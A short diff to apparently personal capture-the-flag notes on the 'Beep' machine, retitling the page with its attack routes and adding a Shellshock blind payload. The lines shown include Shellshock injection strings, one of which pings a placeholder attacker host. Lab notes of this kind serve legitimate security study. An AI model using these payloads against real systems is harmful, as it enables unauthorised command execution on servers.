@@ -2,7 +2,7 @@
 <html xmlns="http://www.w3.org/1999/xhtml">
 <head>
 <meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
-<title>Beep</title>
+<title>Beep - SIP Poison LFI CGI ShellShock</title>
 </head><body>4 different ways, remember, sometimes there are more than one ways to "hack the box" :)<br/>
 <br/>
 elastix is PBX software<br/>
@@ -34,6 +34,7 @@ Sipvicious:<br/>
 CGI files: "generally vulnerable to shellshock"<br/>
 &nbsp;&#09;Note you might never see your command being executed. Blind payloads:<br/>
 &nbsp;&#09;() { :; }; sleep 10<br/>
+&nbsp;&#09;() { :; }; /bin/sleep 10<br/>
 &nbsp;&#09;() { :; }; /bin/ping -c 1 &lt;LHOST&gt;<br/>
 Things that run on GCI files...like webmin or others<br/>
 <br/>
